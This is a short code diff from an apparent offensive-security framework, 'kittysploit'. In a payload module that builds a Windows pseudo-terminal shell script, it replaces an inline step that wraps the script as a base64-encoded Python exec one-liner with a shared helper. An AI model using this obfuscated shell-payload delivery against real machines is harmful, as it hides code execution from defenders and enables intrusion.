@@ -1,5 +1,4 @@
 from kittysploit import *
-import base64
 
 from lib.shell.pty_runtime import build_windows_conpty_script
 
@@ -120,5 +119,4 @@ class Module(Payload):
 			from core.output_handler import print_warning
 			print_warning("EXE compilation failed, falling back to Python command")
 
-		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
+		return self._encode_python_one_liner(script, self.python_binary)
